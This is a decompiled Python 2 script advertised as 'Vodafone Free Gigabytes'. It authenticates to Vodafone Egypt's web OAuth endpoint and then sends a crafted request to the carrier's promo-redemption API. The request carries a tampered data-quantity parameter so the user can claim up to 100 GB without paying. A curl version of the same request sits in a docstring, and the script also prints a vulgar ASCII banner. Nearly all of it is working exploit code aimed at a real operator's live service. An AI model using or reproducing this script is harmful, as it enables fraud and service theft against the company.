# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.15+ (default, Aug 31 2018, 11:56:52) 
# [GCC 8.2.0]
# Embedded file name: voda_medo.py
import uuid
import sys
import urllib3
import requests
from urllib import quote_plus
from requests import get, post
from time import sleep, time
from os import popen, system, name
from thread import start_new_thread
urllib3.disable_warnings()

def clear():
    system('cls' if name == 'nt' else 'clear')



logo = '\n\n\t##########################################################\n\t>>>>>      Vodafone Free Gigabytes by Castiel0x      <<<<<  \n\t>>>>>           Mohamed A Medo : FB/Castiel0x        <<<<<  \n\t>>>>>              Script  by Randomiizer     \t     <<<<< \n\t########################################################## \n\n'
mid_finger = "\n\n....................../\xc2\xb4\xc2\xaf/) \n....................,/\xc2\xaf../ \n.................../..../ \n............./\xc2\xb4\xc2\xaf/'...'/\xc2\xb4\xc2\xaf\xc2\xaf`\xc2\xb7\xc2\xb8 \n........../'/.../..../......./\xc2\xa8\xc2\xaf\\ \n........('(...\xc2\xb4...\xc2\xb4.... \xc2\xaf~/'...') \n.........\\.................'...../ \n..........''...\\.......... _.\xc2\xb7\xc2\xb4 \n............\\..............( \n..............\\.............\\...\n\n"
clear()
print logo

def get_access(user, password):
    url = 'https://web.vodafone.com.eg/services/security/oauth/oauth/token'
    headers = {'Origin': 'https://web.vodafone.com.eg',
       'msisdn': '',
       'Accept-Encoding': 'gzip, deflate, br',
       'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8,de;q=0.7,ru;q=0.6,fr;q=0.5',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
       'api-host': 'token',
       'access-token': '',
       'Content-Type': 'application/x-www-form-urlencoded',
       'Accept': 'application/json',
       'Connection': 'keep-alive',
       'DNT': '1'
       }
    data = 'username={}&password={}&grant_type=password&client_id=my-trusted-client&client_secret=secret'.format(user, password)
    while 1:
        try:
            response = requests.post(url, timeout=5, headers=headers, data=data)
            break
        except:
            sleep(1)

    try:
        return response.json()['access_token']
    except:
        return False


def get_gigas(user, access, q):
    """
            curl -i -s -k  -X 'POST'     -H 'Content-Type: application/json' -H 'access-token: ACCESSTOKEN-HERE' -H 'msisdn: NUMBER-HERE' -H 'api-host: PromoHost'
        --data-binary '{
      "msisdn": "NUMBER-HERE",
      "promoId": "2633",
      "contextualPromoId": "13",
      "channelId": "1",
      "wlistId": "2553",
      "shortcode": null,
      "triggerId": "189",
      "param1": "2",
      "param2": "30000",
      "param3": "0.0",
      "param4": "14",
      "param5": "",
      "param6": "0"
    }'     'https://mobile.vodafone.com.eg/services/promo/unifiedRedeemPromo'
            """
    headers = {'Content-Type': 'application/json',
       'access-token': access,
       'msisdn': user,
       'api-host': 'PromoHost'
       }
    data = '{\n\t  "msisdn": "%s",\n\t  "promoId": "2633",\n\t  "contextualPromoId": "13",\n\t  "channelId": "1",\n\t  "wlistId": "2553",\n\t  "shortcode": null,\n\t  "triggerId": "189",\n\t  "param1": "2",\n\t  "param2": "%s",\n\t  "param3": "0",\n\t  "param4": "14",\n\t  "param5": "",\n\t  "param6": "0"\n\t}' % (user, q)
    while 1:
        try:
            response = requests.post('https://web.vodafone.com.eg/services/promo/unifiedRedeemPromo', headers=headers, data=data)
            break
        except:
            sleep(1)

    print response.content
    if '"eDescription":"Success"' in response.content:
        print 'Gigabytes Collected'
        

    else:
        print 'Bad Error Happened '


try:
    user = str(int(raw_input('Enter Your Number : ')))
except:
    print 'Numbers Only Are Allowed'
    raw_input('Exiting ...')
    sys.exit()




password = raw_input('Enter Your Passowrd : ')
Access = get_access(user, password)
if Access:
    q = int(raw_input('Enter How much Gigas You Want [1:100] : '))
    if q < 1:
        q = 1
    elif q >= 100:
        q = 100
    print 'You Will Get', q, 'GB'
    q = q * 1000
    get_gigas(user, Access, q)
else:
    print 'Number and Password are incorrect'
    raw_input('Exiting ...')
    sys.exit()
raw_input('Exiting ...')
sys.exit()